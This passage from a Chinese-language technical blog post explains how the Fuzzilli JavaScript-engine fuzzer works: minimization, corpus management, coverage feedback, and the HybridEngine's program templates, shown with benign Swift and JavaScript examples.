function_">v2</span>(...);<br>&#125;<br><span class="hljs-title function_">v1</span>(...);<br></code></pre></td></tr></table></figure><p>会随着时间的推移而构建，例如当从另一个程序中拼接函数调用和定义到当前程序中时。</p><p>可以想象，最小化非常昂贵，经常需要超过一百次执行。 然而，虽然最小化开销在模糊测试的早期阶段（当经常发现有趣的样本时）占主导地位，但在模糊测试的后期阶段（当很少发现新的、有趣的程序时），它接近于零。</p><p>可以通过 <code>--minimizationLimit=N</code> CLI 标志来调整最小化器以减少代码的积极程度。 这样，可以强制最小化器使最小化的程序保持在给定的指令数量之上。 这有助于保留一些可能有助于未来变异的额外代码片段。 这也可以稍微加快最小化速度，因为需要删除的指令更少。 但是，将此值设置得太高可能会导致与最小化器尝试首先解决的相同类型的问题。</p><p>除了删除指令，最小化器还尝试以其他方式简化程序。 例如，它尝试将受保护的操作转换为不受保护的操作，删除函数调用中不必要的参数，合并包含相同值的变量，并将一些复杂的指令转换为更简单的指令（例如，将扩展调用转换为常规调用）。</p><h4 id="Corpus"><a href="#Corpus" class="headerlink" title="Corpus"></a>Corpus</h4><p>实现：<code>Corpus.swift</code></p><p>Fuzzilli 将“有趣的”样本保存在其语料库中以供未来变异。 在默认语料库实现中，样本被添加、然后随机变异，并在它们被变异至少一定次数后（通过 <code>--minMutationsPerSample</code> 标志控制）最终“退役”。 也可以实现其他语料库管理算法。 例如，已经实现了一种基于马尔可夫链的语料库管理算法。</p><p>如果使用 <code>--storagePath</code> CLI 标志，Fuzzilli 会将其添加到语料库中的所有样本以 protobuf 格式写入磁盘。 例如，这些可以通过 <code>--resume</code> 恢复之前的模糊测试会话，或者可以使用 FuzzILTool 进行检查。</p><h4 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h4><p>实现：<code>Compiler/</code></p><p>默认情况下，Fuzzilli 始终从语料库中单个任意选择的程序开始。 可能希望从现有的程序语料库开始，例如查找过去错误的变体。 在 Fuzzilli 中，这需要从 JavaScript 到 FuzzIL 的编译器，因为 Fuzzilli 只能对 FuzzIL 程序进行操作。 Fuzzilli 附带了这样一个编译器，它使用 babel.js 来解析 JavaScript 代码，然后使用一个相对简单的编译器来处理生成的 AST 并从中生成 FuzzIL 程序。 该编译器尚未完成所有功能，需要支持更多的语言结构。</p><h4 id="Coverage"><a href="#Coverage" class="headerlink" title="Coverage"></a>Coverage</h4><p>实现：<code>Evaluation/</code> 子目录</p><p>为了确定是否应将生成的程序添加到语料库中，Fuzzilli 依赖于代码覆盖率作为指导指标。 为了获得覆盖率信息，目标 JavaScript 引擎使用 <code>-fsanitize-coverage=trace-pc-guard</code> 进行编译，并且向其中添加了一个小代码存根，该代码存根通过 REPRL 接口在每次执行 JavaScript 程序期间收集边缘覆盖率信息。 在每次执行新生成的程序之后，都会处理覆盖率位图，以确定是否发现了 JavaScript 引擎控制流图中的任何新分支（因此覆盖率增加）。 如果是这样，则该样本被确定为有趣的，并在最小化后添加到语料库中。</p><p><strong>应该注意的是，在 JIT 编译器的情况下，Fuzzilli 仅收集编译器代码上的覆盖率信息，而不收集生成代码上的覆盖率信息。 这比尝试检测生成的代码（如果原始 JavaScript 代码被变异，生成的代码将迅速改变）要简单得多。 此外，通常应该是这种情况，JIT 编译器仅编译已经执行多次的代码。 因此，生成的 JIT 代码之后也被执行的可能性应该相当高。 无论如何，研究是否可以将关于发出的 JIT 代码的覆盖率指导用作指导指标仍然是未来研究的主题。</strong></p><h4 id="关于确定性的一点说明"><a href="#关于确定性的一点说明" class="headerlink" title="关于确定性的一点说明"></a>关于确定性的一点说明</h4><p>现代 JavaScript 引擎在后台线程上执行各种任务，例如 JIT 编译或垃圾回收。 除其他原因外，这可能导致非确定性行为：一个样本可能触发一次 JIT 编译器或 GC 边缘，但在随后的执行期间不会触发。 如果 Fuzzilli 保留了这样的样本，它将对变异引擎的有效性产生负面影响，例如因为 Fuzzilli 将无法最小化该样本，并且随后会“浪费”许多执行来尝试变异它。 为了处理这个问题，Fuzzilli 默认情况下确保新发现的样本能够确定性地触发新的边缘。 这是通过重复执行样本并形成触发边缘的交集来实现的，直到该交集变得稳定为止。 此外，在使用分布式模糊测试时，worker 实例在导入样本时会重新执行样本，从而也确保了确定性行为。</p><p>由于与非确定性行为相关的崩溃可能难以重现但仍然可能很有趣，因此 Fuzzilli 在重现器样本中包含了原始失败消息（例如，断言失败消息和堆栈跟踪）以及退出代码作为注释，以帮助进行分析。</p><h4 id="变异算法"><a href="#变异算法" class="headerlink" title="变异算法"></a>变异算法</h4><p>Fuzzilli 的变异引擎遵循基于变异的模糊器的典型过程：从语料库中获取一个样本（在 Fuzzilli 的例子中是一个 FuzzIL 程序），并变异给定的次数。 在变异期间，变量的类型通过 JSTyper 进行近似，以允许更智能的变异。 如果在任何时候，变异后的样本触发了新的覆盖率，则在最小化后将其添加到语料库中。 然而，为了实现高度的语义正确性，如果变异导致无效的程序，变异引擎将恢复变异。 这确保了高度的语义正确性，因为只有有效的程序被变异，并且因为每个变异只有相对较低的概率将有效的程序变为无效的程序。</p><p>变异引擎实现的高级算法总结在下图。</p><img src="/2025/03/13/Fuzzilli源码分析/mutation_engine.png"  alt="mutation_engine" style="zoom: 67%;" /><h3 id="当前变异引擎的局限性"><a href="#当前变异引擎的局限性" class="headerlink" title="当前变异引擎的局限性"></a>当前变异引擎的局限性</h3><p>免责声明：本节主要基于思维实验、现有的模糊测试研究、直觉、已发现（尤其是未发现）的漏洞以及偶尔的语料库检查，而不是专门的实验或测量。</p><p>本节试图从理论的角度讨论变异引擎的局限性。</p><p>可以将模糊器视为从可能的输入宇宙中进行采样的工具。 从这个角度来看，Fuzzilli 将从所有语法上有效的 JavaScript 程序的宇宙中进行采样。 Fuzzilli 的一个通用原则是，它不应该尝试（均匀地）从所有语法上有效的 JavaScript 程序的整个宇宙中进行采样，因为那个宇宙太大了。 因此，需要某种形式的指导来（希望）将模糊器引导到更有可能触发错误的样本。 在 MutationEngine 中，这种指导（主要）来自覆盖率反馈，它自动将模糊器引导到具有高复杂度的代码区域。 可以使用额外的、手动的指导来偏向模糊器，例如通过旨在触发 JIT 编译的特定 CodeGenerators。 这样，变异引擎基本上从可以通过将 N 个连续的变异应用于语料库中的程序而到达的程序集合中进行采样，而语料库中的程序是那些触发新覆盖率的程序。 此外，应该存在这样的情况：一个样本离语料库“越远”，就越不可能被发现，因为导致它的长度为 N 的可能变异“路径”的数量减少（即，一个非常接近语料库中样本的样本可能可以通过许多不同的变异来找到，而一个遥远的样本需要特定的变异序列才能到达）。</p><p>然后，MutationEngine 将能够找到与语料库中的错误有些“接近”的错误，但不能找到远离语料库的错误。</p><p>那么，关键问题是语料库中样本的分布可能是什么样子，因为它极大地影响了生成的样本的总体分布。 这里的论点是，语料库中的样本通常只会触发引擎的一个或几个特性，因为一个新程序不太可能一次触发多个新的、复杂的优化。 这可以通过查看典型语料库中样本的新发现的边缘数量（<code>--inspect</code> 将包含它）来在一定程度上进行测量。 下表显示了针对 JavaScriptCore 进行的具有大约 20000 个样本的模糊测试运行的结果：</p><table><thead><tr><th>新边的数量</th><th>样本数量</th><th>占总数的百分比</th><th>平均大小（以JS LoC为单位）</th></tr></thead><tbody><tr><td>1</td><td>9631</td><td>48%</td><td>40</td></tr><tr><td>2-5</td><td>5999</td><td>30%</td><td>61</td></tr><tr><td>6-10</td><td>1580</td><td>8%</td><td>69</td></tr><tr><td>10+</td><td>2849</td><td>14%</td><td>74</td></tr></tbody></table><p>因此，MutationEngine 可能最大的缺点之一是它很难找到需要对相关对象执行多个不同操作的漏洞。 虽然覆盖率指导会奖励模糊器第一次触发每个操作的实现，但将它们组合成单个数据流不会有额外的奖励。 类似地，一旦模糊器触发了一次回调机制（例如 valueOf 回调或 Proxy 陷阱），它可能不会因为在不同的上下文（例如不同的内置函数）中触发相同的回调机制而获得奖励，尽管这可能会导致有趣的错误。</p><p>对此问题有许多可能的解决方案：</p><ul><li>设计一种替代指导指标，作为纯代码覆盖率的替代或补充，该指标引导模糊器发现现有指标难以发现的错误。 例如，该指标可以尝试将覆盖率反馈与某种形式的数据流分析相结合，以奖励模糊器在同一数据流上触发多个不同的特性。 这是未来研究的主题。</li><li>从旧漏洞的概念验证代码或回归测试中为模糊器播种，以找到可以通过有些类似的代码触发的剩余错误。 这可以通过使用上面讨论的 FuzzIL 编译器将现有的 JavaScript 代码编译成 FuzzIL 语料库来实现。 这种方法本质上仅限于寻找与过去漏洞至少有些相似的错误。</li><li>改进代码生成基础设施并使用它从头开始创建新程序，可能针对目标 JavaScript 引擎的特定错误类型或组件。 本文档的其余部分讨论了这种方法和实现它的 HybridEngine。</li></ul><h3 id="The-HybridEngine"><a href="#The-HybridEngine" class="headerlink" title="The HybridEngine"></a>The HybridEngine</h3><p>实现：<code>HybridEngine.swift</code>（<code>--engine=hybrid</code>）</p><p>HybridEngine 背后的核心思想是将代码生成与现有的变异和拼接机制相结合。 这实现了许多目标：</p><ul><li>通过配置生成的程序的形状和方面（例如，强调 JavaScript 引擎的某些区域或特定 API），可以实现手动模糊器指导。</li><li>允许纯代码生成器保持相当简单，而是依赖于变异器使生成的代码更有趣或更正确。 特别是，FixupMutator 专门设计用于帮助 HybridEngine 生成正确且有意义的程序。</li><li>它可以防止过度专业化，并提高发出的代码的多样性，因为变异（主要是输入和操作变异）是完全随机且无偏的（例如，它们忽略任何类型信息）。 因此，它们也经常导致语义上无效的样本。</li><li>它使代码生成引擎能够“学习”有趣的代码片段，因为这些片段将被添加到语料库中（由于覆盖率反馈），然后用于拼接。 因此，即使在生成式模糊测试模式下，仍然使用代码覆盖率反馈。</li></ul><p>与 MutationEngine 相比，HybridEngine 主要缺乏覆盖率指导。 因此，它需要以不同的方式解决许多问题：</p><h4 id="1-正确性问题"><a href="#1-正确性问题" class="headerlink" title="1. 正确性问题"></a>1. 正确性问题</h4><p>由于变异引擎会恢复无效的变异（那些导致引发运行时异常的变异），因此变异期间的代码生成可能有些激进，因此导致更多无效的样本。 然而，当从头开始生成整个程序时，生成的样本的正确率更为重要。 因此，代码生成器需要小心不要生成无效的代码。 这通过多种方式实现：</p><ul><li>代码生成器应选择正确类型的输入变量。 例如，发出函数调用的生成器应确保所选变量包含可调用的值。</li><li>当代码生成器无法证明在运行时不会抛出异常时（这可能由于多种原因发生，包括当前没有所需类型的变量可用），可以使用受保护的指令（或显式的 try-catch 块）。 如上所述，FixupMutator 和 Minimizer 都会负责删除不必要的保护。</li><li>还有一些其他的临时机制，试图防止无效程序的常见来源。 例如，ProgramBuilder 支持“递归保护”，它可以防止琐碎的递归。</li></ul><h4 id="2-意义性问题"><a href="#2-意义性问题" class="headerlink" title="2. 意义性问题"></a>2. 意义性问题</h4><p>考虑以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> v0 = ...;<br><span class="hljs-keyword">let</span> v1 = v0 / &#123;&#125;;<br></code></pre></td></tr></table></figure><p>虽然语义上有效（运行时不会抛出异常），但该代码在很大程度上是语义上无意义的，因为它只会产生 NaN（非数字）值。 因此，无论 v0 的实际值如何，此代码的输出状态空间都是 1。 （大多数）无意义操作的其他示例包括加载或删除不存在的属性（这将始终导致未定义）、对没有自定义 toPrimitive 转换运算符的对象或非数字字符串执行任何类型的数学运算（算术运算符或 Math 函数）、将不正确类型的值作为参数传递给内置函数，或在非对象上存储属性。</p><p>理想情况下，“无意义”很可能被定义为始终导致引擎的相同内部状态转换，而不管输入类型和周围代码如何。 由于这很难衡量，Fuzzilli 对该术语的解释在很大程度上是模糊的近似值，因此 Fuzzilli 认为无意义的某些操作实际上会在某些引擎中引起一些有趣的行为。 然而，由于执行的变异，“无意义”的代码仍然会被生成（只是不是以不合理的高概率），希望允许发现相关的错误。</p><p>在变异引擎中，代码覆盖率与最小化器相结合有效地解决了这个问题：无意义的代码片段不会触发任何新的覆盖率，因此会在包含在语料库中之前被最小化器删除。 因此，语料库包含的主要是<em>有意义的代码片段，因此生成的代码也主要是</em>有意义的。</p><p>然而，生成式引擎没有依赖于覆盖率反馈的奢侈（除了拼接）。 因此，代码生成引擎的主要设计目标是努力以高频率生成有意义的代码，其中有意义的宽松定义是，对于给定的输入类型，输出可以根据输入值具有不同的值。 在实践中，这个例子意味着执行按位运算的 CodeGenerator 应该需要数值输入值而不是完全任意的输入值：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">CodeGenerator</span>(<span class="hljs-string">&quot;BitOp&quot;</span>, inputs: .preferred(.number, .number)) &#123; b, lhs, rhs <span class="hljs-keyword">in</span><br>    b.binary(lhs, rhs, with: chooseUniform(from: allBitwiseOperators))<br>&#125;<br></code></pre></td></tr></table></figure><p>此外，FixupMutator（最终）也旨在通过检测运行时无意义的操作并将它们更改为更有意义的操作来解决此问题。</p><h4 id="3-前瞻性问题"><a href="#3-前瞻性问题" class="headerlink" title="3. 前瞻性问题"></a>3. 前瞻性问题</h4><p>考虑 Fuzzilli 生成函数定义的情况（例如通过 PlainFunctionGenerator）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">v4, v5</span>) &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里，当生成函数体时，v4 和 v5 的类型是未知的，因为它们只能在稍后调用该函数时由 JSTyper 观察到。 然而，如果参数只是设置为未知类型（FuzzIL 类型系统中的 .anything），那么主体中的代码将无法有意义地使用它们。</p><p>因此，解决方案是每次生成函数时都生成一个随机但非平凡的函数签名。 例如，在伪代码中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">v4: <span class="hljs-built_in">Number</span>, v5: JSArray</span>) -&gt; <span class="hljs-title class_">JSArray</span> &#123;<br>    <span class="hljs-comment">// 可以在这里有意义地使用 v4 和 v5</span><br>    ...;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，主体中的代码可以有意义地使用参数，并且它的返回值也可以被使用。 该函数将具有存储在其类型中的签名（就像内置函数和方法一样），因此将来对其进行的任何调用都将尝试获取正确类型的参数值。 生成签名时，会考虑当前可用的变量，以使生成无法满足的签名的概率非常低。</p><p>一个相关的问题是如何处理自定义对象类型，例如生成如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">v3</span>) &#123;<br>    <span class="hljs-keyword">return</span> v3.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">c</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>为了使这成为可能，Fuzzilli 不仅必须知道 v3 的类型，还必须知道其属性的类型。</p><p>这可以通过预先生成许多自定义对象类型并在生成器中使用它们来类似地解决。 例如，以下类型可能用于上面的 v3：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">v3 = .<span class="hljs-title function_">object</span>(<span class="hljs-string">&quot;ObjType1&quot;</span>, [<br>    .<span class="hljs-property">a</span>: .<span class="hljs-title function_">object</span>(<span class="hljs-string">&quot;ObjType2&quot;</span>, [<br>        .<span class="hljs-property">b</span>: .<span class="hljs-title function_">object</span>(<span class="hljs-string">&quot;ObjType3&quot;</span>, [<br>            .<span class="hljs-property">c</span>: .<span class="hljs-property">integer</span><br>        ])<br>    ])<br>])<br></code></pre></td></tr></table></figure><p>为了使此方法有效，生成对象或属性存储的代码生成器必须遵守这些属性类型。</p><h4 id="程序模板"><a href="#程序模板" class="headerlink" title="程序模板"></a>程序模板</h4><p>如前所述，需要某种指导机制将模糊器引导到代码的特定区域。 在 HybridEngine 中，这通过 ProgramTemplates 实现：程序结构的高级描述，然后从中生成具体的程序。 这有效地限制了搜索空间，因此可以更有效地发现漏洞。</p><p>接下来显示 ProgramTemplate 的示例。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">ProgramTemplate</span>(<span class="hljs-string">&quot;JITFunction&quot;</span>) &#123; b <span class="hljs-keyword">in</span><br>    <span class="hljs-comment">// 从一个随机前缀和一些随机代码开始。</span><br>    b.buildPrefix()<br>    b.build(n: <span class="hljs-number">5</span>)<br><br>    <span class="hljs-comment">// 生成一个较大的函数并为其生成一个签名</span><br>    <span class="hljs-keyword">let</span> f <span class="hljs-operator">=</span> b.buildPlainFunction(with: b.randomParameters()) &#123; args <span class="hljs-keyword">in</span><br>        <span class="hljs-built_in">assert</span>(args.count <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>)<br>        b.build(n: <span class="hljs-number">30</span>)<br>        b.doReturn(b.randomVariable())<br>    &#125;<br><br>    <span class="hljs-comment">// 触发 JIT 优化</span><br>    b.buildRepeatLoop(n: <span class="hljs-number">100</span>) &#123; <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span><br>        b.callFunction(f, withArgs: b.randomArguments(forCalling: f))<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个相当简单的模板旨在通过生成一个随机函数，强制编译它，然后使用不同的参数再次调用它来搜索 JIT 编译器错误。</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>以下是 HybridEngine 如何基于上述模板生成程序的示例。 请注意，并非所有 CodeGenerators 都已迁移以与 HybridEngine 很好地配合使用（例如，通过在必要时发出受保护的指令），因为这仍在进行中。</p><h5 id="1-前缀代码生成"><a href="#1-前缀代码生成" class="headerlink" title="1. 前缀代码生成"></a>1. 前缀代码生成</h5><p>该模板首先通过 b.buildPrefix() 方法生成一个小的“前缀”。 前缀只是代码片段，其目的是创建一些变量以供后续代码使用。 通常建议从这样的前缀开始，因为它确保 CodeGenerators 具有可见变量以用作输入。 在底层，前缀生成执行代码生成，但只使用标记为“值生成器”的一小部分代码生成器。 这些必须始终生成新变量并且不得失败。 结果可能是一段代码，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">v0 &lt;- <span class="hljs-title class_">LoadInt</span> <span class="hljs-string">&#x27;42&#x27;</span><br>v1 &lt;- <span class="hljs-title class_">LoadInt</span> <span class="hljs-string">&#x27;1337&#x27;</span><br>v2 &lt;- <span class="hljs-title class_">LoadString</span> <span class="hljs-string">&#x27;foo&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="2-随机代码生成"><a href="#2-随机代码生成" class="headerlink" title="2. 随机代码生成"></a>2. 随机代码生成</h5><p>模板的下一部分只是使用主代码生成 API：ProgramBuilder.build(n:) 生成几个随机指令。 对于代码生成，ProgramBuilder 将重复选择随机 CodeGenerators 并运行它们，直到至少生成 n 个指令。 例如，CodeGenerator 可以如下所示：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">CodeGenerator</span>(<span class="hljs-string">&quot;BinOp&quot;</span>, inputs: .preferred(.number, .number)) &#123; b, lhs, rhs <span class="hljs-keyword">in</span><br>    <span class="hljs-keyword">let</span> needGuard <span class="hljs-operator">=</span> b.type(of: lhs).<span class="hljs-type">MayBe</span>(.bigint) <span class="hljs-operator">||</span> b.type(of: rhs).<span class="hljs-type">MayBe</span>(.bigint)<br>    b.binary(lhs, rhs, with: chooseUniform(from: allBinaryOperators), guard: needGuard)<br>&#125;<br></code></pre></td></tr></table></figure><p>请注意，生成器如何小心地生成正确且有意义的代码，同时又不对其输入要求过于严格。 它的做法是声明它“希望”接收数字作为输入（这意味着如果有可用的变量，则应使用数字调用它，但也可以使用不同类型的变量调用），然后检查其中一个输入是否可能是 BigInts（在这种情况下，很可能会出现运行时异常：“TypeError: Cannot mix BigInt and other types, use explicit conversions”），如果是，则将操作标记为受保护的（导致在运行时使用 try-catch）。</p><p>在此上下文中，可以使用 v0 和 v1 调用生成器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">v3 &lt;- <span class="hljs-title class_">Binary</span> v0, <span class="hljs-string">&#x27;*&#x27;</span>, v1<br></code></pre></td></tr></table></figure><p>由于静态已知两个输入的类型都不是 BigInts，因此不需要任何保护。</p><p>此时，只生成了一个新指令，因此代码生成将继续。 然而，为了简洁起见，在本例中我们将在此处停止代码生成并继续到模板的下一部分。</p><h5 id="3-函数生成"><a href="#3-函数生成" class="headerlink" title="3. 函数生成"></a>3. 函数生成</h5><p>模板的下一部分负责生成一个随机函数。 为此，第一步是使用 ProgramBuilder.randomParameters API 生成一个随机签名。 这将查看现有变量及其类型，并基于它们选择签名。 这样，以后很有可能找到合适的参数值。 在此特定情况下，它可以提出诸如 [.string, .int] 之类的签名，因为存在两种类型的现有变量。 请注意，签名尚不包括返回值类型。 这将仅在函数定义结束时根据函数体内部生成的 Return 语句来计算。</p><p>生成签名后，模板将创建函数并使用代码生成机制填充其主体。 这次，我们将使用以下三个代码生成器：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">CodeGenerator</span>(<span class="hljs-string">&quot;BuiltinGenerator&quot;</span>) &#123; b <span class="hljs-keyword">in</span><br>    b.loadBuiltin(b.randomBuiltin())<br>&#125;,<br><br><span class="hljs-type">CodeGenerator</span>(<span class="hljs-string">&quot;FunctionCallGenerator&quot;</span>, inputs: .preferred(.function())) &#123; b, f <span class="hljs-keyword">in</span><br>    <span class="hljs-keyword">let</span> arguments <span class="hljs-operator">=</span> b.randomArguments(forCalling: f)<br>    <span class="hljs-keyword">let</span> needGuard <span class="hljs-operator">=</span> b.type(of: f).<span class="hljs-type">MayNotBe</span>(.function())  <span class="hljs-comment">// 技术上，如果参数类型与签名不匹配，也需要保护</span><br>    b.callFunction(f, withArgs: arguments, guard: needGuard)<br>&#125;,<br><br><span class="hljs-type">CodeGenerator</span>(<span class="hljs-string">&quot;ComputedPropertyAssignmentGenerator&quot;</span>, inputs: .preferred(.object())) &#123; b, obj <span class="hljs-keyword">in</span><br>    <span class="hljs-keyword">let</span> propertyName <span class="hljs-operator">=</span> b.randomVariable()<br>    <span class="hljs-keyword">let</span> value <span class="hljs-operator">=</span> b.randomVariable()<br>    <span class="hljs-keyword">let</span> needGuard <span class="hljs-operator">=</span> b.type(of: obj).<span class="hljs-type">MayBe</span>(.nullish)<br>    b.setComputedProperty(propertyName, of: obj, to: value, guard: needGuard)<br>&#125;,<br></code></pre></td></tr></table></figure><p>运行第一个生成器时，ProgramBuilder.randomBuiltin API 将查询静态环境模型以查找可用的内置函数。 在这种情况下，环境模型可能包含以下内置函数：<code>bar: .function([] =&gt; .anything)</code>，然后选择它。 接下来，代码生成可能会选择 FunctionCallGenerator。 因为它声明它需要 .function() 作为参数，所以 ProgramBuilder 会（可能）选择先前加载的内置函数。 因为它的签名是已知的，所以没有为调用选择任何参数值，并且返回值类型为 .anything。 最后，代码生成可能会选择 ComputedPropertyAssignmentGenerator。 因为当前没有类型为 .object() 的可用值，所以函数调用的返回值（可能）会被选择，因为它具有类型 .anything。 这样，至少有机会使该值在运行时成为对象。 由于不能排除该值不是“nullish”（null 或 undefined）的情况，在这种情况下会引发运行时异常，因此代码生成器将操作标记为受保护的。 将所有内容放在一起，为函数生成以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">v4 &lt;- <span class="hljs-title class_">BeginPlainFunction</span> -&gt; v5, v6<br>    v7 &lt;- <span class="hljs-title class_">LoadBuiltin</span> <span class="hljs-string">&#x27;bar&#x27;</span><br>    v8 &lt;- <span class="hljs-title class_">CallFunction</span> v7, []<br>    <span class="hljs-title class_">SetComputedProperty</span> v8, v5, <span class="hljs-title function_">v6</span> (guarded)<br>    <span class="hljs-title class_">Return</span> v8<br><span class="hljs-title class_">EndPlainFunction</span><br></code></pre></td></tr></table></figure><h5 id="4-组合各个部分"><a href="#4-组合各个部分" class="headerlink" title="4. 组合各个部分"></a>4. 组合各个部分</h5><p>模板的其余部分只是生成一个循环来调用在步骤 3 中生成的函数。 通常，应该使用不同的参数再次调用该函数几次，并且可能在执行更多随机生成的代码之后。 为了使本示例保持简短，此处省略了这些步骤。</p><p>提升到 JavaScript（使用表达式内联），生成的代码现在将是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f4</span>(<span class="hljs-params">a5, a6</span>) &#123;<br>    <span class="hljs-keyword">let</span> v8 = <span class="hljs-title function_">bar</span>();<br>    <span class="hljs-keyword">try</span> &#123; v8[a5] = a6; &#125; <span class="hljs-keyword">catch</span> &#123;&#125;<br>    <span class="hljs-keyword">return</span> v8;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v9 = <span class="hljs-number">0</span>; v9 &lt; <span class="hljs-number">100</span>; v9++) &#123;<br>    <span class="hljs-title function_">f6</span>(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-number">42</span> * <span class="hljs-number">1337</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>生成后，样本将被进一步变异。 由于 FixupMutator 对于 HybridEngine 特别有用，因此它始终用作第一个变异器，以“完善”生成的程序。 在这种情况下，变异器可能会发现不需要 try-catch 保护（如果它在运行时从未触发），因此可以将其删除，从而产生最终的（“完善的”）程序：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f4</span>(<span class="hljs-params">a5, a6</span>) &#123;<br>    <span class="hljs-keyword">let</span> v8 = <span class="hljs-title function_">bar</span>();<br>    v8[a5] = a6;<br>    <span class="hljs-keyword">return</span> v8;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v9 = <span class="hljs-number">0</span>; v9 &lt; <span class="hljs-number">100</span>; v9++) &#123;<br>    <span class="hljs-title function_">f6</span>(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-number">42</span> * <span class="hljs-number">1337</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>随后的变异可能会以各种有趣（和不太有趣）的方式更改生成的程序。</p><h4 id="Code-Generation-Mutations-The-HybridEngine"><a href="#Code-Generation-Mutations-The-HybridEngine" class="headerlink" title="Code Generation + Mutations: The HybridEngine"></a>Code Generation + Mutations: The HybridEngine</h4><p>HybridEngine 将代码生成引擎与现有的变异器结合在一起。 为此，它首先选择一个随机 ProgramTemplate，然后使用如前所述的代码生成引擎从中生成一个程序。 如果生成的程序有效，它将使用 Mutationengine 也使用的算法进一步变异几次。</p><p>混合引擎使用的高级算法总结在下图。</p><img src="/2025/03/13/Fuzzilli源码分析/hybrid_engine.png"  alt="hybrid_engine" style="zoom:67%;" /><p>HybridEngine 可以通过不同的方式使用。接下来将讨论这些内容。</p><h4 id="Application-Component-Fuzzing"><a href="#Application-Component-Fuzzing" class="headerlink" title="Application: Component Fuzzing"></a>Application: Component Fuzzing</h4><p>通过 ProgramTemplates，可以将模糊器引导到引擎的主要组件，例如 JIT 编译器。 除了对目标代码（以及可能其中的过去错误）有高级别的理解之外，这种模板可能几乎不需要任何努力。</p><p>应用：补丁正确性验证和变体模糊测试</p><p>HybridEngine 的另一个应用是搜索先前错误的变体。</p><p>这种技术的一个很好的例子是 V8MapTransition 模板。 该模板搜索 CVE-2020-16009 的变体（并尝试验证补丁的正确性）。 这个想法只是将代码生成引擎限制为一小组 JavaScript 特性，即对象字面量、属性加载和存储以及函数定义和调用，以减少搜索空间。 